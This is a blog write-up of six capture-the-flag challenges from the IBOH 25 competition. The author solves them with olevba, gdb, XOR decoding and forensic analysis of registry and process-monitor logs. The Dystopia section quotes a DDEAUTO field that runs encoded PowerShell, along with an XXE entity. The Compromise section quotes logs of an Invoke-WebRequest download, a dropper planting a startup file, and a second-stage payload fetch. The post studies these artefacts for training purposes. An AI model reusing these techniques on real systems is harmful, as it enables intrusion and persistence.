---
title: "IBOH 25 Writeup"
date: 2025-11-09 23:00:00 +0800
categories: [CTF, Writeups, Physical]
tags: [cybersecurity, ctf, forensics, ai]
author: Mynz
---

# IBOH 25 Writeup (Physical)

This time, my team PERISAI Beta managed to get 5th place and advance to Stage 2 in the Attack & Defense format 😆. This is my 2nd CTF write-up, covering the six challenges I solved. Thanks again to my teammates, Jerit3787 and m0n3tr (same person from Siber Siaga, actually) 🥳.

## Challenge 1: pika pika

**Challenge Creator:** @identities

**Connection:** `http://47.130.175.253:7860/`

### Description
Can you make my pikachu not pikachu?

Flag Format: BOH25{flag}

### Solution
The challenge ask for us how to make the pikachu not pikachu, so first lets look at the website

![pika pika website](/assets/img/IBOH25/pikapikawebsite.png)

we are given 2 images, after trying to upload the pokemon image

![pika pika attempt](/assets/img/IBOH25/pikapikaattempt.png)

yep stll no flag, both images give same result, so i decided to just edit the pokemon image until it not look like pikachu (based on experience)

![pika pika solved](/assets/img/IBOH25/pikapikasolved.png)


**Flag:** `BOH25{ADVeR$aR1@1_IMAG3$}`

## Challenge 2 : Dystopia

**Challenge Creator:** @codtx7791

### Description
Year 2085. The megacities are under total control. Memories are erased. History is rewritten. Hope is extinct.

Flag Format: BOH25{flag_content}

### Solution
So this time, the challenge give us a .docx file, which is a Microsoft Word Document. So i opened it using Word and got this prompt

![dystopia error 1](/assets/img/IBOH25/DystopiaError1.png)

It says theres an unreadable content in it, so who dont want to click yes right? hehehehe 😅

After clicking yes, it showed me a security warning saying the document contained links that might refer to other files.

![dystopia error 2](/assets/img/IBOH25/DystopiaError2.png)

I clicked Yes again 😆, and Word then displayed another prompt saying it had found some errors and needed to repair the file.

![dystopia error 3](/assets/img/IBOH25/DystopiaError3.png)

But.. nope, it didnt give me anything useful (coz i dont know what is that), so i ask ChatGPT, if theres any clue, and he suggest to use **olevba** command on linux, and this is the result.

```bash
┌──(kali㉿kali)-[~/CTF/IBOH25]
└─$ olevba dystopia.docx
olevba 0.60.2 on Python 3.13.9 - http://decalage.info/python/oletools
===============================================================================
FILE: dystopia.docx
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: dystopia/word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub PrintFlag()
    Dim arr As Variant
    Dim i As Long
    Dim result As String
    
    arr = Array(70, 108, 97, 103, 32, 51, 58, 32, 78, 48, 95, 72, 48, 80, 51, 95, 76, 51, 70, 84, 125)
    
    result = ""
    For i = LBound(arr) To UBound(arr)
        result = result & Chr(arr(i))
    Next i
End Sub

-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub PrintFlag()
    Dim arr As Variant
    Dim i As Long
    Dim result As String
    
    arr = Array(70, 108, 97, 103, 32, 51, 58, 32, 78, 48, 95, 72, 48, 80, 51, 95, 76, 51, 70, 84, 125)
    
    result = ""
    For i = LBound(arr) To UBound(arr)
        result = result & Chr(arr(i))
    Next i
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
+----------+--------------------+---------------------------------------------+

```

you can see the that olebva highlights suspicious keywords (like Chr, Shell, Eval) that often mean the code is trying to hide or run something.


> [!NOTE]
> Olevba is a small tool that looks inside Microsoft Office files (like .docx) and pulls out any hidden macro programs. It shows the macro code and points out suspicious bits so you don’t have to open the file in Word and risk running anything dangerous.

**Fun fact about macros:** VBA macros do not exist in the mobile versions of Word, only in the desktop versions. Mobile apps for iOS and Android are not capable of running VBA code.


> 💡 **So what is olevba?**
Olevba is a small tool that looks inside Microsoft Office files (like .docx) and pulls out any hidden macro programs. It shows the macro code and points out suspicious bits so you don’t have to open the file in Word and risk running anything dangerous.

**Fun fact that i know about VBA macros:** it doest exist in mobile version of Word, only in desktop version

okay back to the challenge, 

you can see from the olevba output,the macro code had a list of numbers like this

```bash
arr = Array(70,108,97,103,32,51,58,32,78,48,95,72,48,80,51,95,76,51,70,84,125)
```

So decode it using cyberchef will give you the 3rd part of the flag

**Flag 3** `N0_H0P3_L3FT}`

Next, i want to find other flag and suggest what other ways i can find the flag, and it says to look into headers and footer, and give me this command

```bash
for file in word/header*.xml word/footer*.xml; do
    echo "=== $file ==="
    unzip -p dystopia.docx "$file" 2>/dev/null
    echo ""
done
```

and from the command, i found this, it print quite a lot of lines but this one is interesting

```bash
w:rPr><w:instrText xml:space="preserve">DDEAUTO "powershell" "-EncodedCommand ZWNobyBGbGFnIDE6IEJPSDI1e0wwU1RfUDNSUzBOXzFOXzQ="</
```

convert the command from base64 will give you the 1st flag

echo Flag 1: BOH25{L0ST_P3RS0N_1N_4

**Flag 1** `BOH25{L0ST_P3RS0N_1N_4`

Nice, we managed to get 2 piece of flag, next i ask again where to look again in the docx file, and it gives this command

```bash
unzip -l dystopia.docx | grep -v "header\|footer\|document.xml\|core.xml\|app.xml"
```

and this its output

![Dystopia Command](/assets/img/IBOH25/DystopiaCommand1.png)

after try and error checking the file (not all tho 😭), i found the flag in **word/webSettings.xml**

use the same format of command like how i check the header but change it into webSettings.xml

```bash
for file in word/webSettings.xml; do
    echo "=== $file ==="
    unzip -p dystopia.docx "$file"
    echo ""
done
```

You will find this in the output

```bash
<!DOCTYPE f [
  <!ENTITY xxe "&#x46;&#x6C;&#x61;&#x67;&#x20;&#x32;&#x3A;&#x20;&#x5F;&#x44;&#x31;&#x53;&#x54;&#x30;&#x50;&#x31;&#x34;&#x5F;&#x57;&#x31;&#x54;&#x48;&#x5F;">
]>
<w:div w:id="2037923037">
  <w:bodyDiv w:val="&xxe;"/>
```

convert it using cyberchef with HTML Entity as the recipe you will get the 2nd flag

```bash
Flag 2: _D1ST0P14_W1TH_
```

**Final Flag**: `BOH25{L0ST_P3RS0N_1N_4_D1ST0P14_W1TH_N0_H0P3_L3FT}`

## Challenge 3 : hi

**Challenge Creator:** @hg7199

### Description
Identify hidden function and access it using gdb

Flag Format: BOH25{flag}

### Solution
So we are given an exe file, but after using file command, it shows that the file is binary actually

```bash
o.exe: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=50ac482d6d4b0e7681add7a7374a7740524cef28, for GNU/Linux 3.2.0, not stripped
```

So the question ask to find the hidden func, and i use dogbolt.org (an online decompiler, not recommed to decompile big file 😔) after that i found that the func names are readable, so i just try find famous keyword like flag, secret and found secret_func()

then i use gdb and call it

 ![hi solved](/assets/img/IBOH25/hisolved.png)

**Flag:** `BOH25{D1d_u_s0lv3d_it_w17h0u7_CHa7GP7_?_W311_D0n3!}`


## Challenge 4 : Packed with Flag

**Challenge Creator:** @identities

### Description
The flag is packed in the binary, solve it

Flag Format: BOH25{flag}

### Solution
This time the challenge creator actually give us binary file named challenge

```bash
challenge: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), BuildID[sha1]=f67503cad304d4be6e786a1732fe93b10701487f, for GNU/Linux 3.2.0, statically linked, no section header
```

then i sent it again to online compiler but the output seems obfuscated, so this time i really need ChatGPT help, after some deep talk with him, he said :

"From the reverse-engineering part, the binary does this:
``` csharp
out[i] = A[i] ^ B[i % 4] ^ 0x11
```
* A = the secret flag characters.
* B = a 4-byte repeating key.
* ^ = XOR (a reversible operation).

So the program encrypted the flag using a small XOR key and printed it."

and he suggest to use xxd command to see the binary dump

![packed with flag hexdump](/assets/img/IBOH25/packedwithflaghexdump.png)

i give him the output with flag format IBOH25{}, which gives the first few plaintext, and i ask him to figure out the rest. Here the code he gave me

```python
c = bytes.fromhex('2a2a20575d1e25250630292937543b3a1b110154243a032c0653150a')
known = b"BOH25{"
key = bytes(c[i] ^ known[i] ^ 0x11 for i in range(4))
flag = bytes(c[i] ^ key[i % 4] ^ 0x11 for i in range(len(c)))
print("Key:", key)
print("Flag:", flag.decode())
```

Running the code will give
```bash
Key: b'ytyt'
Flag: BOH25{M@nUAL_1S_sti1L_kIn6}
```

**Flag:** `BOH25{M@nUAL_1S_sti1L_kIn6}`


## Challenge 5 : Snapshots

**Challenge Creator:** @cofastic

### Description
In the year 2087, the Government monitors every digital footprint through a mandatory system surveillance. A rebellious employee workstation was seized after they were caught accessing the forbidden archives. Intelligence suggests they created a secret folder to store the critical intel that they had found, then changed its visibility to hidden to cover their tracks. The State's automated scanners missed it, but a before/after system snapshot was recovered that captured them in the act of creating and concealing the folder.

Dig through the registry changes and extract the folder name. The resistance is counting on you.

### Solution

Yep, **190667 lines in 1 txt files**.

I dont know if this is what digital forensic invetigator sees everyday 😨, but it just veryyy long, so i just ask Windsurf on how to solve this challenge, and he managed to find a newly added registry key with hex encoded data at line **190302**. Crazy

but before that, here some knowledge about this challenge

> the challenge provides a Regshot registry comparison file (`res-x64_000.txt`) that shows all registry changes between two snapshots. When a folder is created or accessed in Windows, it leaves traces in the registry, specifically in the **BagMRU** (Most Recently Used) keys.

> BagMRU (Bag Most Recently Used) is a Windows registry key that stores:
> - Folder view settings
> - Window positions and sizes
> - Recently accessed folder paths

Even when folders are hidden, Windows still records them in BagMRU when they are accessed through File Explorer.

```bash
HKU\...\Shell\BagMRU\1\4\2:  7E 00 31 00 00 00 00 00 ... 42 00 4F 00 48 00 32 00 35 00 7B 00 73 00 75 00 70 00 33 00 72 00 5F 00 73 00 33 00 63 00 72 00 33 00 74 00 5F 00 66 00 30 00 6C 00 64 00 33 00 72 00 7D 00 00 00 18 00 00 00
```

The hex data actually contains Unicode text (UTF-16LE encoding) because it has 00 after each character. The flag starts here

```bash
42 00 4F 00 48 00 32 00 35 00 7B 00 73 00 75 00 70 00 33 00 72 00 5F 00 73 00 33 00 63 00 72 00 33 00 74 00 5F 00 66 00 30 00 6C 00 64 00 33 00 72 00 7D 00
```
You can try use cyberchef to decode it, the recipe is like this

![snapshot cyberchef](/assets/img/IBOH25/snapshotcyberchef.png)

**Flag:** `BOH25{sup3r_s3cr3t_f0ld3r}`


## Challenge 6 : Compromise

**Challenge Creator:** @cofastic

### Description
You're a SOC analyst at CyberCorp in 2087, where the corporate surveillance grid monitors all employee workstations. Your SIEM has triggered a critical alert unauthorized remote access has been detected on a workstation. Initial analysis shows a suspicious executable was launched, which then executed a command line operation to retrieve additional forensic data from an external link. The attacker also attempted to download a secondary payload from an external source. During the intrusion, the attacker executed an ipconfig command that returned sensitive system information in an base64 format.

Your mission: Analyze the provided process monitor logs to identify the complete attack chain. Extract the name of the initial malicious executable, the full URL it used to retrieve the secondary payload, and the base64 encoded ipconfig response that was exfiltrated.

Flag Format: BOH25{malicious.exe_full-url_base64encodedresponse}

### Solution

My most late submit challenge solve in, i was left with 20 minutes left, very engaging and i like it, thank youuu challenge creator, cofastic.

So we are given a logfile.PML, yeah how to see that is i just convert it into CSV file

And yep, it has **214898** lines

So i just ask Windsurf to analyse it for me and he found the main culprit, the initial malicious executeble which is the Chrome.exe found at line 19100

```bash
"1:32:07.9786378 PM","Explorer.EXE","4564","Process Create","C:\Users\FlareVM\Documents\Chrome\Chrome.exe","SUCCESS","PID: 476"
```
**Chrome.exe** was executed from a suspicious location (`C:\Users\FlareVM\Documents\Chrome\`) which is not the legitimate Chrome browser location.

Also he says that Chrome.exe drops a persistence file:

```bash
"1:32:08.1486064 PM","Chrome.exe","476","CreateFile","C:\Users\FlareVM\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\mscordll.exe","SUCCESS"
```

**Flag 1** `Chrome.exe`

Next we found a Google Drive Folder,

https://drive.usercontent.google.com/u/0/uc?id=1FiMaHG4H99v_nsvXXSKnzrnQBDjS_j8P&export=download

both on line 173046 a & 173047

```bash
"1:32:19.9151409 PM","powershell.exe","1436","Process Create","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","SUCCESS","PID: 6828, Command line: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -Command Invoke-WebRequest -Uri https://drive.usercontent.google.com/u/0/uc?id=1FiMaHG4H99v_nsvXXSKnzrnQBDjS_j8P&export=download -OutFile 'traffic.pcap' "

"1:32:19.9151509 PM","powershell.exe","6828","Process Start","","SUCCESS","Parent PID: 1436, Command line: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -Command Invoke-WebRequest -Uri https://drive.usercontent.google.com/u/0/uc?id=1FiMaHG4H99v_nsvXXSKnzrnQBDjS_j8P&export=download -OutFile 'traffic.pcap' , Current directory: C:\Users\FlareVM\, Environment: 
```

pasting this link into the browser will directly download the pcap file, then i open the pcap file and follow the tcp stream, it shows this on the 1st stream

```bash
GET /msdcorelib.exe HTTP/1.1
Host: serv1.ec2-102-95-13-2-ubuntu.local
Connection: Keep-Alive
user-agent: Nim httpclient/1.0.6


HTTP/1.1 200 OK
Connection: Close
Date: Wed, 13 Aug 2025 03:57:33 GMT
Content-Type: x-msdos-program
Content-Length: 11776
Server: INetSim HTTP Server
```

I ask Windsurf and it says the malware downloads a secondary payload from the internal server. Why internal? Because of the .local tld

- Chrome.exe is requesting to download **msdcorelib.exe** (another executable)
- The hostname ends in `.local` = this is a **local network server**, not the internet
- The user-agent is "Nim httpclient" = Chrome.exe (written in Nim) made this request, not a real browser
- This is a classic 2-stage malware attack: small dropper → downloads bigger payload

So our 2nd part will be 

**Flag 2** `http://serv1.ec2-102-95-13-2-ubuntu.local/msdcorelib.exe`


Next, in the stream 6 in the TCP Stream, i found 3 base64 encoded strings, and one of the is

```
CldpbmRvd3MgSVAgQ29uZmlndXJhdGlvbgoKCkV0aGVybmV0IGFkYXB0ZXIgRXRoZXJuZXQ6CgogICBDb25uZWN0aW9uLXNwZWNpZmljIEROUyBTdWZmaXggIC4gOiAKICAgTGluay1sb2NhbCBJUHY2IEFkZHJlc3MgLiAuIC4gLiAuIDogZmU4MDo6NmNkZTpjZjdkOjQ1ZGE6ZjNiZSU4CiAgIElQdjQgQWRkcmVzcy4gLiAuIC4gLiAuIC4gLiAuIC4gLiA6IDEwLjAuMC4zCiAgIFN1Ym5ldCBNYXNrIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiA6IDI1NS4yNTUuMjU1LjAKICAgRGVmYXVsdCBHYXRld2F5IC4gLiAuIC4gLiAuIC4gLiAuIDogCg==
```

Which after decoding will give us the base64 encoded ipconfig response that was exfiltrated

```
Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::6cde:cf7d:45da:f3be%8
   IPv4 Address. . . . . . . . . . . : 10.0.0.3
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 
```

So our final flag will look like this

**Final Flag** `BOH25{Chrome.exe_http://serv1.ec2-102-95-13-2-ubuntu.local/msdcorelib.exe_CldpbmRvd3MgSVAgQ29uZmlndXJhdGlvbgoKCkV0aGVybmV0IGFkYXB0ZXIgRXRoZXJuZXQ6CgogICBDb25uZWN0aW9uLXNwZWNpZmljIEROUyBTdWZmaXggIC4gOiAKICAgTGluay1sb2NhbCBJUHY2IEFkZHJlc3MgLiAuIC4gLiAuIDogZmU4MDo6NmNkZTpjZjdkOjQ1ZGE6ZjNiZSU4CiAgIElQdjQgQWRkcmVzcy4gLiAuIC4gLiAuIC4gLiAuIC4gLiA6IDEwLjAuMC4zCiAgIFN1Ym5ldCBNYXNrIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiA6IDI1NS4yNTUuMjU1LjAKICAgRGVmYXVsdCBHYXRld2F5IC4gLiAuIC4gLiAuIC4gLiAuIDogCg==}`

## Scoreboard IBOH 25

![Scoreboard IBOH 25](/assets/img/IBOH25/ScoreboardIBOH25.png)   